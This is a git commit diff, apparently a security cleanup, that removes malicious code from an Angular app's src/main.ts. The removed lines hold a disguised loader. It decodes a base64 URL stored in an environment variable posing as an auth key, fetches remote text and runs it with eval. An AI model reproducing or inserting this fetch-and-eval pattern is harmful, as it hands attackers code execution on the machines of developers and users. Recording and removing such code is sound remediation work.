ff1ac70e8fea778bf36aeed00e5b98e806f7304a
Akbar Anung Yudha Saputra <akbarsaputrait@outlook.com>
2026-09-07 11:45:19 +0700

    security: remove compromised code

--- src/main.ts
+++ src/main.ts
@@ -3,22 +3,6 @@ import { appConfig } from './app/app.config';
 import { AppComponent } from './app/app.component';
 import { environment } from './environments/environment';
 import { enableProdMode } from '@angular/core';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 if (environment.production) {
   enableProdMode();
